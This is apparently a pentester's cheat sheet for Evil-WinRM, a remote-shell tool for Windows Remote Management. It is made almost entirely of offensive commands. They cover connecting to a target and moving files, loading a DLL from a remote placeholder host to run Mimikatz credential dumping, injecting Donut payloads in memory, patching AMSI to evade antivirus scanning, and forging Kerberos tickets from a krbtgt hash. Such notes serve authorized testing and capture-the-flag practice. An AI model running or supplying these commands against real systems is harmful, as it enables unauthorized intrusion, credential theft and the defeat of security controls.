# Evil WinRm

## Link

`https://github.com/Hackplayers/evil-winrm`

## Simple Usage

```bash
$ ruby evil-winrm.rb -i 10.10.10.172 -u user -p password
```

## Upload and Download

```bash
> upload local_filename (destination_filename)
> download remote_filename (destination_filename)
```

## Listing Services and Loading Modules and Scripts

```bash
# List all services showing if there your account has permissions over each one
> services

# Menu listing loaded modules (default presented below)
> menu

# You can load local PS1 scripts just by typing script name
# The scripts must be in the path set at -s argument
> Powerview.ps1
> menu
```

## Using Advanced Commands

```bash
# Invoke-Binary
# Allows exes compiled from c# to be executed in memory
# The executables must be in the path set at -e argument
> Invoke-Binary /opt/csharp/Binary.exe 'param1, param2, param3'

# DLL Loader
# allows loading dll libraries in memory. The dll file can be hosted by smb, http or locally.
# You can then use auto-completion
> Dll-Loader -http -path http://xx.xx.xx.xx/sharpsploit.dll
> [Sharpsploit.Credentials.Mimikatz]::LogonPasswords()

# Donut Loader
# allows to inject x64 payloads generated with awesome donut technique
# No need to encode the payload.bin, just generate and inject
https://github.com/Hackplayers/Salsa-tools/blob/master/Donut-Maker/donut-maker.py
python3 donut-maker.py covenant.exe

# Bypass-4MSI
# patchs AMSI protection
> amsiscanbuffer
> Bypass-4MSI
> amsiscanbuffer
```

## Using Kerberos

```bash
# First, date synchro
rdate -n <dc-ip>

# Ticket generation (ticketer, kirbi rubeus or mimikatz...)
ticketer.py -dc-ip <dc_ip> -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain <domain_name> <user>
python ticket_converter.py ticket.kirbi ticket.ccache

# Add ccache ticket (2 ways)
export KRB5CCNAME=/foo/var/ticket.ccache
cp ticket.ccache /tmp/krb5cc_0

# Add realm to /etc/krb5.conf (for linux). Use of this format is important
CONTOSO.COM = {
             kdc = fooserver.contoso.com
 }

# Check ticket
klist
```
